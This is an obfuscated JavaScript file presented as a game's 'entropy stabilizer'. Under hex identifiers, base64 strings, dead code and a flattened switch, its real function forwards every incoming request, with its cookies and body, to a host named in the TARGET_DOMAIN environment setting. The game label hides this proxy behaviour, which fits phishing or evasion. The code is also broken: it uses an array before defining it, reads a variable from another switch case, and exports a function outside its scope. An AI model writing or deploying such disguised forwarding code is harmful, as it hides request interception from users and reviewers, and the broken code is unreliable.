// littell game - entropy stabilizer v9.3.1
(function(_0x1a2b3c,_0x4d5e6f){var _0x7g8h9i=function(_0x0x1y2z){while(--_0x0x1y2z){_0x1a2b3c['push'](_0x1a2b3c['shift']());}};_0x7g8h9i(++_0x4d5e6f);}(_0x3f4a5b,0x1f4));

var _0x3f4a5b=[atob('dGFyZ2V0X2RvbWFpbg=='),atob('aHR0cHM6Ly8='),'Configuration parameter missing','Invalid target alignment','littell game core initialized'];

(function(){
    const _0x9k8m7p = 0x0;
    const _0x2q4w6e = [function(_0x8v3x){return _0x8v3x;}, function(_0x5t7y){return _0x5t7y+1;}, function(_0x1a2b){return _0x1a2b*2;}];

    const _0x4r9t2y = async function(_0x6u8i0o) {
        // random noise block
        if (_0x2q4w6e[0](42) === 42) {
            var _0xdeadcode1 = Math.random() > 0.5 ? "shadow" : "phantom";
        }

        let _0x3v5b7n = process.env[_0x3f4a5b[0]] || process.env['TARGET_DOMAIN'];

        if (!_0x3v5b7n) {
            return new Response(_0x3f4a5b[2] + " in quantum registry", {status: 500});
        }

        let _0x9p2m5k;
        try {
            _0x9p2m5k = new URL(_0x3v5b7n);
        } catch(_0xerr) {
            return new Response(_0x3f4a5b[3], {status: 500});
        }

        // control flow dispatcher simulation
        let _0xstate = 0;
        while(true) {
            switch(_0xstate) {
                case 0:
                    const _0xreq = new Request(_0x9p2m5k.toString(), _0x6u8i0o);
                    _0xstate = 1;
                    break;
                case 1:
                    const _0xres = await fetch(_0xreq);
                    return _0xres;
                default:
                    _0xstate = -1;
            }
            if (_0xstate === -1) break;
        }
    };

    // dead code injection layer
    const _0xunused = function(){
        return _0x3f4a5b[1] + "fake";
    };

    return _0x4r9t2y;
})();

export default _0x4r9t2y;
